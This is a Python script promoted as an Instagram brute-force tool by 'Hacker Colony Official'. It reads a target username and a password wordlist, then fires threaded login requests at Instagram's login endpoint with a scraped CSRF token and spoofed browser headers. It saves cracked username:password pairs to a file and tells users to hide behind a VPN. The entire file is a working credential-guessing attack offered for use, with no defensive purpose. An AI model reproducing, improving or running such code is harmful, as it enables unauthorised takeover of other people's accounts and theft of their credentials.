# author : Shantanu patel
# Hacker Colony Official
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input
import colorama

CheckVersion = str(sys.version)
import re
from datetime import datetime

os.system("clear")

def anime(text):
  for txt in text:
    sys.stdout.write(txt)
    sys.stdout.flush()
    time.sleep(0.01)


logo = '''\033[1;33m

                    ▒█░▒█ ░ ▒█▀▀█ ░ ▒█▀▀▀█
                    ▒█▀▀█ ▄ ▒█░░░ ▄ ▒█░░▒█
                    ▒█░▒█ █ ▒█▄▄█ █ ▒█▄▄▄█


         \033[1;34m .:H a c k e r  C o l o n y  O f f i c i a l:.

                __Instagram Brute Force Attack__

'''
anime(logo)

sp = " >> Script By Azhar << \n"
name = f"\n\t\t    {colorama.Back.RED + colorama.Fore.WHITE}{sp}"
anime(name)
print(colorama.Back.RESET)
print(colorama.Fore.RESET)

ghub = colorama.Back.BLACK + " >> \033[97;1mOur More Tools On GitHub HackersColonyOfficial << "
anime(f"     {ghub}")
print(colorama.Back.RESET)

print("\n\n\033[31mNotice :-> Please use vpn before running the tool..")
print("\033[38mInformation :-> For Quiting This Program Enter --> q\n\033[0m")
try:
 class InstaBrute(object):
     def __init__(self):
         try:
            user = input('\033[1;32mUsername :\033[0;35m ')
            if user == 'q':
             endmsg ="Thanks For Using Our Service\nDont Forget to Subscribe Hackers Colony Official \n"
             time.sleep(0.8)
             anime(endmsg)
             time.sleep(2)
             sys.exit()
            wrdlst = input('\033[1;32mwordlist :\033[0;33m ')
            if wrdlst == 'q':
             endmsg ="Thanks For Using Our Service\nDont Forget To Subscribe Hackers Colony Official\n"
             time.sleep(0.8)
             anime(endmsg)
             time.sleep(2)
             sys.exit()
            print('\n----------------------------------------------------------------\n')

         except:
            endmsg = green+"Thanks For Using Our Service\nDont Forget To Subscribe Hackers Colony Official"
            time.sleep(0.8)
            anime(endmsg)
            time.sleep(2)
            sys.exit()

         with open(wrdlst, 'r') as x:
            wordlist = x.read().splitlines()
         thread = []
         self.Coutprox = 0
         for words in wordlist:
            password = words.split(':')[0]
            t = threading.Thread(target=self.login, args=(user, password))
            t.start()
            thread.append(t)
            time.sleep(0.9)
         for k in thread:
            k.join()

     def cls(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

     def login(self, user, pwd):
        link = 'https://www.instagram.com/accounts/login/'
        login_url = 'https://www.instagram.com/accounts/login/ajax/'

        time = int(datetime.now().timestamp())

        payload = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
            'queryParams': {},
            'optIntoOneTap': 'false'
        }

        with requests.Session() as s:
            r = s.get(link)
            csrf = re.findall(r"csrf_token\":\"(.*?)\"", r.text)[0]
            r = s.post(login_url, data=payload, headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/login/",
                "x-csrftoken": csrf
            })
            print(f'{user}:{pwd}\n----------------------------')

            if 'authenticated: true' in r.text:
                print(('' + user + ':' + pwd + ' --> Successfully Cracked '))
                x = open('finally.txt','a')
                x.write(user + ':' + pwd + '\n')
                x.close()
            elif 'two_factor_required' in r.text:
                print(('' + user + ':' + pwd + ' -->  Good but Two Factor Required'))
                with open('account_Verfiy.txt', 'a') as x:
                    x.write(user + ':' + pwd + '\n')


 InstaBrute()
except:
  print(" ")
